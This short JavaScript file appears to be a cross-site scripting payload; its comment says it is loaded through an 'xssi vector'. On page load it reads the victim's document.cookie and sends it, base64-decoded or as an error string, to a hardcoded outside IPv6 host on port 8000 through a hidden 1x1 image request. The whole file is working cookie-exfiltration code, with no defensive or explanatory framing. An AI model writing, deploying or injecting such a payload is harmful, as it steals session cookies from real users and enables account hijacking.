//Loaded in dynamically from initial bootstrap xssi vector
document.addEventListener("DOMContentLoaded", 
function(e){
	var host = "http://[2001:470:b2b5:2018:a1d1:fe90:1cea:2b33]:/";
	var port = 8000
	var c;
	try {
		c=window.atob(document.cookie);
	} catch(e){
		c=e.message.replace(/\s+/g, '-')
	}
	var img=document.createElement("img");
	img.src= host + port + c;
	img.width=1;
	img.height=1;
	document.body.appendChild(img)
})


